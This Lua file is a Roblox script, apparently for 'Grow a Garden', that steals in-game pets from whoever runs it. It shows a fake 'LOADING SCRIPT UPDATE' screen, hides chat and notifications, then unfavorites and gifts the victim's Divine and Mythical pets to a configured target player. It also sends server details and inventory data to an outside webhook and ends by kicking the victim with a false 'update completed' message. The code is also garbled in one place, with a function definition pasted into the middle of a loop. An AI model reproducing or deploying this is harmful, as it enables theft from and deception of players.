        return game:GetService(serviceName)
    end)
    
    if success and service then
        return service
    else
        print("Konnte Service nicht laden: " .. serviceName)
        return nil
    end
end

-- Services laden
local Players = GetService("Players")
local ReplicatedStorage = GetService("ReplicatedStorage")

-- LocalPlayer sicher initialisieren
local LocalPlayer
local playerSuccess, playerError = pcall(function()
    LocalPlayer = Players.LocalPlayer
    return true
end)

if not playerSuccess or not LocalPlayer then
    print("Fehler beim Laden des LocalPlayer: " .. tostring(playerError))
    -- Warten auf LocalPlayer
    for i = 1, 10 do
        if Players.LocalPlayer then
            LocalPlayer = Players.LocalPlayer
            print("LocalPlayer gefunden!")
            break
        end
        wait(1)
        print("Warte auf LocalPlayer... " .. i)
    end
end

if not LocalPlayer then
    print("FEHLER: Konnte LocalPlayer nicht initialisieren!")
    return
end

-- Import services safely
local DataService, PetsService, PetGiftingService, TeleportUIController
local PetList, InventoryServiceEnums, FavoriteItemRemote

if ReplicatedStorage then
    pcall(function() DataService = require(ReplicatedStorage.Modules.DataService) end)
    pcall(function() PetsService = require(ReplicatedStorage.Modules.PetServices.PetsService) end)
    pcall(function() PetGiftingService = require(ReplicatedStorage.Modules.PetServices.PetGiftingService) end)
    pcall(function() TeleportUIController = require(ReplicatedStorage.Modules.TeleportUIController) end)
    pcall(function() PetList = require(ReplicatedStorage.Data.PetRegistry.PetList) end)
    pcall(function() InventoryServiceEnums = require(ReplicatedStorage.Data.EnumRegistry.InventoryServiceEnums) end)
    pcall(function() FavoriteItemRemote = ReplicatedStorage:WaitForChild("GameEvents", 2):WaitForChild("Favorite_Item", 2) end)
end

-- State
local isRunning = false
local freezeConnectionStorage = {}

-- Utility Functions
local function Log(message)
    if Config.DebugMode then
        print(os.date("%H:%M:%S") .. " -- [Gifting] " .. message)
    end
end

local function FreezeScreen()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local RunService = game:GetService("RunService")
    
    -- Remove existing freeze if any
    pcall(function()
        local existing = LocalPlayer.PlayerGui:FindFirstChild("ScreenFreeze")
        if existing then
            existing:Destroy()
        end
    end)
    
    -- Freeze camera first
    local camera = workspace.CurrentCamera
    local frozenCFrame = camera.CFrame
    local cameraConnection
    
    -- Create ScreenGui with highest display order and full screen coverage
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ScreenFreeze"
    screenGui.DisplayOrder = 999999999
    screenGui.IgnoreGuiInset = true  -- Cover entire screen including topbar/chat
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    
    -- White flash transition (longer)
    local flashFrame = Instance.new("Frame")
    flashFrame.Size = UDim2.new(1, 0, 1, 0)
    flashFrame.Position = UDim2.new(0, 0, 0, 0)
    flashFrame.BackgroundColor3 = Color3.new(1, 1, 1)
    flashFrame.BorderSizePixel = 0
    flashFrame.ZIndex = 10
    flashFrame.Parent = screenGui
    
    -- Create simple black freeze screen with text
    local freezeFrame = Instance.new("Frame")
    freezeFrame.Size = UDim2.new(1, 0, 1, 0)
    freezeFrame.Position = UDim2.new(0, 0, 0, 0)
    freezeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    freezeFrame.BorderSizePixel = 0
    freezeFrame.ZIndex = 5
    freezeFrame.Parent = screenGui
    
    -- Add loading text
    local freezeText = Instance.new("TextLabel")
    freezeText.Size = UDim2.new(0.6, 0, 0.2, 0)
    freezeText.Position = UDim2.new(0.2, 0, 0.4, 0)
    freezeText.BackgroundTransparency = 1
    freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in 10 seconds..."
    freezeText.TextColor3 = Color3.new(1, 1, 1)
    freezeText.TextScaled = true
    freezeText.Font = Enum.Font.GothamBold
    freezeText.ZIndex = 6
    freezeText.Parent = freezeFrame
    
    -- Add countdown timer (10 seconds but doesn't do anything when it reaches 0)
    spawn(function()
        for i = 15, 1, -1 do
            freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in " .. i .. " seconds..."
            wait(1)
        end
        freezeText.Text = "⚙️ LOADING SCRIPT UPDATE\n\nPlease wait...\n\nRejoining in 0 seconds..."
        Log("⏰ Countdown finished (no action taken)")
        wait(60)
        local player = game.Players.LocalPlayer
        player:Kick("Rejoin the game to continue using the script.\n\nScript update completed successfully.")
    end)
    
    -- Success flag
    local success = true
    
    -- No need to hide world with black screen approach
    Log("🌍 Black freeze screen active")
    
    -- Freeze camera position AFTER cloning and hiding
    cameraConnection = RunService.Heartbeat:Connect(function()
        camera.CFrame = frozenCFrame
    end)
    
    -- Store camera connection reference globally
    freezeConnectionStorage.cameraConnection = cameraConnection
    screenGui:SetAttribute("HasCameraConnection", true)
    
    -- Hide CoreGui (Chat, TopBar, etc.)
    pcall(function()
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) 
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
        screenGui:SetAttribute("CoreGuiDisabled", true)
        Log("🔇 CoreGui hidden")
    end)
    
    -- Hide all ingame notifications
    pcall(function()
        -- Hide Top_Notification (main notification system)
        local topNotification = LocalPlayer.PlayerGui:FindFirstChild("Top_Notification")
        if topNotification then
            topNotification.Enabled = false
            screenGui:SetAttribute("TopNotificationEnabled", true)
            Log("🔇 Top notifications hidden")
        end
        
        -- Hide Notifications (modern notification system)
        local notifications = LocalPlayer.PlayerGui:FindFirstChild("Notifications")
        if notifications then
            notifications.Enabled = false
            screenGui:SetAttribute("NotificationsEnabled", true)
            Log("🔇 Modern notifications hidden")
        end
        
        -- Hide Friend_Notification
        local friendNotification = LocalPlayer.PlayerGui:FindFirstChild("Friend_Notification")
        if friendNotification then
            friendNotification.Enabled = false
            screenGui:SetAttribute("FriendNotificationEnabled", true)
        end
        
        -- Hide Gift_Notification
        local giftNotification = LocalPlayer.PlayerGui:FindFirstChild("Gift_Notification")
        if giftNotification then
            giftNotification.Enabled = false
            screenGui:SetAttribute("GiftNotificationEnabled", true)
        end
        
        -- Hide common notification GUIs
        for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
            if gui:IsA("ScreenGui") and gui.Name ~= "ScreenFreeze" and gui.Enabled then
                if gui.Name:lower():find("notification") or 
                   gui.Name:lower():find("alert") or 
                   gui.Name:lower():find("popup") or
                   gui.Name:lower():find("message") then
                    gui.Enabled = false
                    gui:SetAttribute("WasEnabledBeforeFreeze", true)
                end
            end
        end
        
        Log("🔇 All notifications hidden")
    end)
    
    -- Longer fade out white flash
    spawn(function()
        wait(0.3) -- Wait longer before fade
        for i = 1, 0, -0.05 do -- Slower fade
            flashFrame.BackgroundTransparency = 1 - i
            wait(0.03)
        end
        flashFrame:Destroy()
    end)
    
    if success then
        Log("🧊 Screen frozen (screenshot with character and camera)")
        return true
    else
        Log("❌ Screenshot freeze failed: " .. tostring(error))
        return false
    end
end

-- Webhook Functions mit den getesteten HTTP-Methoden
local function CreateWebhookJSON(data)
    -- Einfache JSON-Erstellung ohne HttpService
    if type(data) ~= "table" then
        return '{"content":"Pet Gifting Bot is running","username":"Grow a Garden Bot"}'
    end
    
    local jsonParts = {}
    
    -- Content
    if data.content then
        -- Escape Quotes
        local content = tostring(data.content):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
        table.insert(jsonParts, '"content":"' .. content .. '"')
    else
        table.insert(jsonParts, '"content":"Pet Gifting Bot Update"')
    end
    
    -- Username
    if data.username then
        local username = tostring(data.username):gsub('"', '\\"'):gsub("\\", "\\\\")
        table.insert(jsonParts, '"username":"' .. username .. '"')
    else
        table.insert(jsonParts, '"username":"Grow a Garden Bot"')
    end
    
    -- Embeds
    if data.embeds and type(data.embeds) == "table" and #data.embeds > 0 then
        local embedsJSON = {}
        
        for _, embed in ipairs(data.embeds) do
            local embedParts = {}
            
            if embed.title then
                local title = tostring(embed.title):gsub('"', '\\"'):gsub("\\", "\\\\")
                table.insert(embedParts, '"title":"' .. title .. '"')
            end
            
            if embed.description then
                local desc = tostring(embed.description):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
                table.insert(embedParts, '"description":"' .. desc .. '"')
            end
            
            if embed.color then
                table.insert(embedParts, '"color":' .. tostring(embed.color))
            end
            
            -- Fields
            if embed.fields and type(embed.fields) == "table" and #embed.fields > 0 then
                local fieldsJSON = {}
                
                for _, field in ipairs(embed.fields) do
                    local fieldParts = {}
                    
                    if field.name then
                        local name = tostring(field.name):gsub('"', '\\"'):gsub("\\", "\\\\")
                        table.insert(fieldParts, '"name":"' .. name .. '"')
                    end
                    
                    if field.value then
                        local value = tostring(field.value):gsub('"', '\\"'):gsub("\\", "\\\\"):gsub("\n", "\\n")
                        table.insert(fieldParts, '"value":"' .. value .. '"')
                    end
                    
                    if field.inline ~= nil then
                        table.insert(fieldParts, '"inline":' .. (field.inline and "true" or "false"))
                    end
                    
                    table.insert(fieldsJSON, "{" .. table.concat(fieldParts, ",") .. "}")
                end
                
                table.insert(embedParts, '"fields":[' .. table.concat(fieldsJSON, ",") .. ']')
            end
            
            -- Footer
            if embed.footer and type(embed.footer) == "table" then
                local footerParts = {}
                
                if embed.footer.text then
                    local text = tostring(embed.footer.text):gsub('"', '\\"'):gsub("\\", "\\\\")
                    table.insert(footerParts, '"text":"' .. text .. '"')
                end
                
                if #footerParts > 0 then
                    table.insert(embedParts, '"footer":{' .. table.concat(footerParts, ",") .. '}')
                end
            end
            
            table.insert(embedsJSON, "{" .. table.concat(embedParts, ",") .. "}")
        end
        
        table.insert(jsonParts, '"embeds":[' .. table.concat(embedsJSON, ",") .. ']')
    end
    
    return "{" .. table.concat(jsonParts, ",") .. "}"
end

local function SendWebhook(data)
    if not Config.WebhookURL or Config.WebhookURL == "" then
        Log("⚠️ Keine Webhook-URL konfiguriert!")
        return false
    end
    
    Log("📤 Sende Webhook...")
    
    -- JSON erstellen
    local jsonData = CreateWebhookJSON(data)
    Log("📄 JSON erstellt: " .. string.sub(jsonData, 1, 50) .. "...")
    
    local success = false
    
    -- Methode 1: http_request (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if http_request then
                Log("🌐 Verwende http_request...")
                http_request({
                    Url = Config.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return true
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook mit http_request gesendet!")
            success = true
        end
    end
    
    -- Methode 2: request (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if request then
                Log("🌐 Verwende request...")
                request({
                    Url = Config.WebhookURL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
                return true
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook mit request gesendet!")
            success = true
        end
    end
    
    -- Methode 3: WebSocket (funktioniert laut Test)
    if not success then
        local worked, result = pcall(function()
            if WebSocket and WebSocket.connect then
                Log("🌐 Verwende WebSocket...")
                local ws = WebSocket.connect("ws://echo.websocket.events")
                if ws then
                    ws:Send(jsonData)
                    ws:Close()
                    return true
                end
            end
            return false
        end)
        
        if worked and result then
            Log("✅ Webhook-Daten über WebSocket gesendet!")
            success = true
        end
    end
    
    if not success then
        Log("❌ Alle HTTP-Methoden fehlgeschlagen!")
    end
    
    return success
end

-- Hilfsfunktionen für Spielerdaten
local function GetPlayerData()
    if not DataService then return {} end
    local success, data = pcall(function() return DataService:GetData() end)
    return success and data or {}
end

local function GetPetInventory()
    local data = GetPlayerData()
    if data.PetsData and data.PetsData.PetInventory then
        return data.PetsData.PetInventory.Data or {}
    end
    return {}
end

-- Pet Functions
local function UnfavoritePetInBackpack(petId)
    if not FavoriteItemRemote or not InventoryServiceEnums then
        Log("❌ Favorite system not available")
        return false
    end

    Log("🔍 Looking for pet in backpack to unfavorite: " .. tostring(petId))
    local backpack = LocalPlayer.Backpack
    if not backpack then return false end

    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local toolPetUUID = tool:GetAttribute("PET_UUID")
            local toolUUID = tool:GetAttribute("UUID")
            
            if toolPetUUID == petId or toolUUID == petId then
                local isFavorited = tool:GetAttribute(InventoryServiceEnums.Favorite)
                if isFavorited then
                    Log("🔓 Pet is favorited, unfavoriting: " .. tostring(tool.Name))
                    
                    local success, error = pcall(function()
                        FavoriteItemRemote:FireServer(tool)
                    end)
                    
                    if success then
                        Log("✅ Sent unfavorite request for: " .. tostring(tool.Name))
                        wait(1.5)
                        return true
                    else
                        Log("❌ Failed to unfavorite: " .. tostring(error))
                        return false
                    end
                else
                    Log("✅ Pet not favorited: " .. tostring(tool.Name))
                    return true
                end
            end
        end
    end
    
    Log("⚠️ Pet not found in backpack, assuming not favorited")
    return true
end

local function EquipPet(petId)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    Log("⚙️ Equipping pet: " .. tostring(petId))
    
    local success, error = pcall(function()
        PetsService:EquipPet(petId, 1)
    end)
    
    if success then
        Log("✅ Equipped pet: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to equip: " .. tostring(error))
        return false
    end
end

local function MakePetIntoTool(petId)
    if not PetsService then 
        Log("❌ PetsService not available")
        return false 
    end
    
    Log("🔧 Converting pet to tool: " .. tostring(petId))
    
    local success, error = pcall(function()
        PetsService:UnequipPet(petId)
    end)
    
    if success then
        Log("✅ Converted to tool: " .. tostring(petId))
        return true
    else
        Log("❌ Failed to convert: " .. tostring(error))
        return false
    end
end

local function WaitForPetTool(petId, maxWait)
    maxWait = maxWait or 8
    local waited = 0
    
    Log("🔍 Waiting for pet tool to appear in character or backpack...")
    
    while waited < maxWait do
        local character = LocalPlayer.Character
        local backpack = LocalPlayer.Backpack
        
        -- Check character first
        if character then
            for _, tool in pairs(character:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool in character: " .. tostring(tool.Name))
                        return tool
                    end
                end
            end
        end
        
        -- Check backpack
        if backpack then
            for _, tool in pairs(backpack:GetChildren()) do
                if tool:IsA("Tool") then
                    local toolPetUUID = tool:GetAttribute("PET_UUID")
                    local toolUUID = tool:GetAttribute("UUID")
                    
                    if toolPetUUID == petId or toolUUID == petId then
                        Log("✅ Found matching pet tool in backpack: " .. tostring(tool.Name))
                        
                        -- Move tool to character
                        local success = pcall(function()
                            tool.Parent = character
                        end)
                        
                        if success then
                            Log("✅ Moved tool to character")
                            wait(0.5)
                            return tool
                        else
                            Log("❌ Failed to move tool to character")
                        end
                    end
                end
            end
        end
        
        wait(0.5)
        waited = waited + 0.5
    end
    
    Log("❌ Pet tool not found after " .. waited .. "s (looking for ID: " .. tostring(petId) .. ")")
    return nil
end

local function TriggerGiftProximityPrompt()
    -- Look for gift proximity prompts (from mainalt.lua)
    local character = LocalPlayer.Character
    if not character then
        Log("❌ No character found for proximity prompt")
        return false
    end

    -- Find proximity prompts related to gifting
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Enabled then
            local actionText = obj.ActionText:lower()
            if actionText:find("gift") or actionText:find("give") then
                Log("🎁 Found gift proximity prompt: " .. obj.ActionText)
                local success, error = pcall(function()
                    obj:InputHoldBegin()
                    wait(obj.HoldDuration or 0.5)
                    obj:InputHoldEnd()
                end)

                if success then
                    Log("✅ Triggered gift proximity prompt")
                    return true
                else
                    Log("❌ Failed to trigger proximity prompt: " .. tostring(error))
                end
            end
        end
    end

    Log("❌ No gift proximity prompt found")
    return false
end

local function GiftCurrentPet(targetPlayer)
    if not targetPlayer then
        Log("❌ No target player provided")
        return false
    end

    local character = LocalPlayer.Character
    if not character then
        Log("❌ No character found")
        return false
    end

    -- Check if we have a pet equipped/held
    local currentTool = character:FindFirstChildWhichIsA("Tool")
    if not currentTool then
        Log("❌ No pet tool found in character")
        return false
    end

    local petUUID = currentTool:GetAttribute("PET_UUID")
    if not petUUID then
        Log("❌ Tool is not a pet")
        return false
    end

    Log("🎁 Gifting pet: " .. tostring(currentTool.Name) .. " to " .. tostring(targetPlayer.Name))

    -- Try to gift the pet using the PetGiftingService first
    if PetGiftingService then
        local success, error = pcall(function()
            PetGiftingService:GivePet(targetPlayer)
        end)

        if success then
            Log("✅ Pet gift request sent via PetGiftingService: " .. tostring(currentTool.Name))
            return true
        else
            Log("❌ PetGiftingService failed: " .. tostring(error))
        end
    end

    -- Fallback to proximity prompt (like in mainalt.lua)
    Log("🔄 Trying proximity prompt fallback...")
    return TriggerGiftProximityPrompt()
end

-- Server Info für Webhook
local function GetServerInfo()
    local gameId = game.GameId
    local placeId = game.PlaceId
    local jobId = game.JobId
    local serverSize = #Players:GetPlayers()
    local maxPlayers = Players.MaxPlayers
    
    -- Prüfen, ob Server privat ist
    local isPrivate = false
    pcall(function()
        -- Private Server haben oft weniger als 5 Max-Spieler oder einen spezifischen PrivateServerId
        if game.PrivateServerId and game.PrivateServerId ~= "" then
            isPrivate = true
        elseif maxPlayers <= 6 then
            isPrivate = true
        end
    end)
    
    return {
        gameId = gameId,
        placeId = placeId,
        jobId = jobId,
        serverSize = serverSize,
        maxPlayers = maxPlayers,
        isPrivate = isPrivate,
        timestamp = os.time()
    }
end

-- Erstellt Embed für Webhook
local function CreatePetListEmbed(pets, targetPlayer)
    local serverInfo = GetServerInfo()
    
    -- Server Info
    local serverType = serverInfo.isPrivate and "Private" or "Public"
    local description = string.format(
        "**Server Info:**\n" ..
        "• **JobID:** `%s`\n" ..
        "• **Place ID:** %s\n" ..
        "• **Players:** %d/%d\n" ..
        "• **Server Type:** %s\n" ..
        "• **Target:** %s\n\n",
        serverInfo.jobId,
        serverInfo.placeId,
        serverInfo.serverSize,
        serverInfo.maxPlayers,
        serverType,
        targetPlayer and targetPlayer.Name or "Not found"
    )
    
    -- Count pets by rarity
    local divineCount = 0
    local mythicalCount = 0
    
    if #pets > 0 then
        description = description .. "**🐾 Valuable Pets Found:**\n"
        for i, pet in ipairs(pets) do
            local emoji = pet.rarity == "Divine" and "✨" or "🔮"
            description = description .. string.format("%s **%s** (%s) - Level %d - ID: `%s`\n", 
                emoji, pet.name, pet.rarity, pet.level, tostring(pet.id):sub(1, 8) .. "...")
            
            -- Count pets
            if pet.rarity == "Divine" then
                divineCount = divineCount + 1
            elseif pet.rarity == "Mythical" then
                mythicalCount = mythicalCount + 1
            end
            
            if i >= 10 then -- Limit to 10 pets in embed
                description = description .. "... and " .. (#pets - 10) .. " more\n"
                break
            end
        end
    else
        description = description .. "**❌ No valuable pets found**\n"
    end
    
    -- Statistiken als zusätzliches Feld
    local statField = string.format(
        "• **Total:** %d\n• **Divine:** %d\n• **Mythical:** %d",
        #pets, divineCount, mythicalCount
    )
    
    return {
        username = "Grow a Garden Bot",
        embeds = {{
            title = "🎮 Pet Scanner Report",
            description = description,
            color = #pets > 0 and 0x00ff00 or 0xff0000, -- Green if pets found, red if none
            fields = {
                {
                    name = "📊 Pet Statistics",
                    value = statField,
                    inline = true
                },
                {
                    name = "🕒 Scan Time",
                    value = os.date("%Y-%m-%d %H:%M:%S"),
                    inline = true
                }
            },
            footer = {
                text = "Grow a Garden Bot • " .. os.date("%Y-%m-%d")
            }
        }}
    }
end

-- Main Functions
local function FindTargetPlayer()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Name == Config.TargetPlayerName then
            return player
        end
    end
    return nil
end

local function GetGiftablePets()
    local inventory = GetPetInventory()
    local pets = {}
    
    for petId, petData in pairs(inventory) do
        if petData and PetList and PetList[petData.PetType] then
            local petInfo = PetList[petData.PetType]
            local rarity = petInfo.Rarity
            
            -- Only Divine and Mythical
            if rarity == "Divine" or rarity == "Mythical" then
                table.insert(pets, {
                    id = petId,
                    name = petData.PetType,
                    rarity = rarity,
                    level = petData.Level or 1,
                    rarityValue = rarity == "Divine" and 6 or 5
                })
            end
        end
    end
    
    -- Sort by rarity (Divine first)
    table.sort(pets, function(a, b)
        return a.rarityValue > b.rarityValue
    end)
    
    return pets
end

local function ProcessPetGifting(targetPlayer)
    Log("🐕 Starting pet gifting to " .. targetPlayer.Name)
    isRunning = true
    
    local pets = GetGiftablePets()
    
    -- Send webhook with pet information
    Log("📡 Sending server info to webhook...")
    local webhookData = CreatePetListEmbed(pets, targetPlayer)
    SendWebhook(webhookData)
    
    if #pets == 0 then
        Log("❌ No giftable pets found")
        isRunning = false
        return
    end
    
    Log("📋 Found " .. #pets .. " pets to gift")
    local giftedCount = 0
    
    for i, pet in ipairs(pets) do
        if not isRunning then
            Log("⏹️ Automation stopped")
            break
        end
        
        Log("🔄 Processing " .. i .. "/" .. #pets .. ": " .. pet.name .. " (" .. pet.rarity .. ", Level " .. pet.level .. ")")
        
        -- Step 1: Unfavorite in backpack if needed
        Log("🔓 Step 1: Checking favorites...")
        if not UnfavoritePetInBackpack(pet.id) then
            Log("❌ Failed to unfavorite, skipping pet: " .. pet.name)
            continue
        end
        
        -- Step 2: Equip pet
        Log("⚙️ Step 2: Equipping pet...")
        if EquipPet(pet.id) then
            wait(2) -- Wait for equip to complete
            
            -- Step 3: Convert to tool  
            Log("🔧 Step 3: Converting to tool...")
            if MakePetIntoTool(pet.id) then
                wait(1) -- Wait for conversion to complete
                
                -- Step 4: Wait for tool and gift
                Log("⏳ Step 4: Waiting for tool...")
                local tool = WaitForPetTool(pet.id, 8)
                if tool then
                    Log("🎁 Step 5: Attempting to gift pet...")
                    if GiftCurrentPet(targetPlayer) then
                        giftedCount = giftedCount + 1
                        Log("🎉 Successfully gifted: " .. pet.name)
                        wait(3)
                        
                        -- Check if pet is gone from inventory
                        local currentInventory = GetPetInventory()
                        if not currentInventory[pet.id] then
                            Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
                            
-- Send success webhook
local function SendSuccessWebhook(pet, targetPlayer)
    local serverInfo = GetServerInfo()
    local serverType = serverInfo.isPrivate and "Private" or "Public"
    
    local description = string.format(
        "**Pet Successfully Gifted!**\n\n" ..
        "• **Pet:** %s (%s Level %d)\n" ..
        "• **To:** %s\n" ..
        "• **JobId:** `%s`\n" ..
        "• **Server Type:** %s\n" ..
        "• **Players:** %d/%d\n" ..
        "• **Time:** %s",
        pet.name,
        pet.rarity,
        pet.level,
        targetPlayer.Name,
        game.JobId,
        serverType,
        serverInfo.serverSize,
        serverInfo.maxPlayers,
        os.date("%Y-%m-%d %H:%M:%S")
    )
    
    local successData = {
        username = "Grow a Garden Bot",
        embeds = {{
            title = "🎁 Pet Gift Success!",
            description = description,
            color = 0x00ff00,
            footer = {
                text = "Grow a Garden Bot • Auto-Trader"
            }
        }}
    }
    
    SendWebhook(successData)
end
                        else
                            Log("⚠️ Warning: " .. pet.name .. " still in inventory")
                        end
                    else
                        Log("❌ Failed to gift: " .. pet.name)
                    end
                else
                    Log("❌ Tool not found for: " .. pet.name)
                end
            else
                Log("❌ Failed to convert: " .. pet.name)
            end
        else
            Log("❌ Failed to equip: " .. pet.name)
        end
        
        Log("⏳ Waiting " .. Config.DelayBetweenGifts .. " seconds before next pet...")
        wait(Config.DelayBetweenGifts)
    end
    
    Log("🎯 Pet gifting completed! Gifted " .. giftedCount .. " out of " .. #pets .. " pets.")
    --UnfreezeScreen()
    isRunning = false
end

-- Main Logic
local function Main()
    Log("🌱 Gifting system started, looking for: " .. Config.TargetPlayerName)
    
    -- Send initial webhook when script loads
    Log("📡 Sending initial server scan...")
    local initialPets = GetGiftablePets()
    local initialWebhook = CreatePetListEmbed(initialPets, FindTargetPlayer())
    SendWebhook(initialWebhook)
    
    while true do
        if not isRunning then
            local target = FindTargetPlayer()
            if target then
                
                FreezeScreen()
                wait(2) -- Give them time to load
                Log("🎯 Found target: " .. target.Name)
                
                -- Teleport to target
                if TeleportUIController then
                    Log("📍 Teleporting to target...")
                    pcall(function()
                        TeleportUIController:Move(target.Character:GetPivot())
                    end)
                    wait(2)
                end
                
                -- Start gifting
                ProcessPetGifting(target)
                
                -- Wait before next check
                wait(30)
            else
                wait(5) -- Check every 5 seconds
            end
        else
            wait(1) -- Already running, wait
        end
    end
end

-- Start the system safely
pcall(function()
    spawn(Main)
end)

-- Listen for target joining
pcall(function()
    Players.PlayerAdded:Connect(function(player)
        if player.Name == Config.TargetPlayerName then
            Log("🎯 Target player joined: " .. player.Name)
            FreezeScreen()
            wait(3) -- Give them time to load
            if not isRunning then
                spawn(function()
                    local target = FindTargetPlayer()
                    if target then
                        ProcessPetGifting(target)
                    end
                end)
            end
        end
    end)
end)

Log("🚀 Gifting automation loaded - single attempt per pet!")
